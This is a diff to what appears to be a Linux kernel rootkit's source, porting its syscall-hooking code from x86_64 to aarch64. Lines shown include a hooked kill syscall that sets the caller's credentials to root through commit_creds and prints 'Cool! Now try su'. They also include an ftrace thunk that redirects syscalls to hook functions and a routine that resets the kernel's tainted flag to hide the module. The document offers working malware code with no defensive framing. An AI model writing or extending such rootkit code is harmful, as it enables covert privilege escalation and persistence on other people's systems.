@@ -32,16 +32,25 @@ sys64 real_m_execve;
 sys64 real_m_bpf;
 sys64 real_m_read;
 
-#define PT_REGS_PARM1(x) ((x)->di)
-#define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
-#define PT_REGS_PARM3(x) ((x)->dx)
 #define PT_REGS_PARM4(x) ((x)->cx)
 #define PT_REGS_PARM5(x) ((x)->r8)
 #define PT_REGS_RET(x) ((x)->sp)
 #define PT_REGS_FP(x) ((x)->bp)
 #define PT_REGS_RC(x) ((x)->ax)
 #define PT_REGS_SP(x) ((x)->sp)
+#if defined(__x86_64__)
 #define PT_REGS_IP(x) ((x)->ip)
+#define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
+#define PT_REGS_PARM3(x) ((x)->dx)
+#define PT_REGS_PARM1(x) ((x)->di)
+#elif defined(__aarch64__)
+#define PT_REGS_IP(x) ((x)->pc)
+#define PT_REGS_PARM2(x) ((const char *const *)(x)->regs[1])
+#define PT_REGS_PARM3(x) ((x)->regs[2])
+#define PT_REGS_PARM1(x) ((x)->regs[0])
+#else
+    #error "Unsupported architecture"
+#endif
 
 /**
  * These are kept open throughout kv lifetime
@@ -158,8 +167,16 @@ static asmlinkage long m_kill(struct pt_regs *regs)
         new->fsuid.val = new->fsgid.val = 0;
 
         commit_creds(new);
+#if defined(__x86_64__)
         rootregs.di = 0;
         rootregs.si = 0;
+#elif defined(__aarch64__)
+    rootregs.regs[0] = 0; // equivalent to di
+    rootregs.regs[1] = 0; // equivalent to si
+#else
+    #error "Unsupported architecture"
+#endif
+
         kaddr->k_sys_setreuid(&rootregs);
         prinfo("Cool! Now try 'su'\n");
 
@@ -1120,7 +1137,13 @@ static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
     if (!within_module(parent_ip, THIS_MODULE))
+#if defined(__x86_64__)
         regs->ip = (unsigned long)hook->function;
+#elif defined(__aarch64__)
+        regs->pc = (unsigned long)hook->function;
+#else
+#error "Unsupported architecture"
+#endif
 }
 
 void kv_reset_tainted(unsigned long *tainted_ptr) {
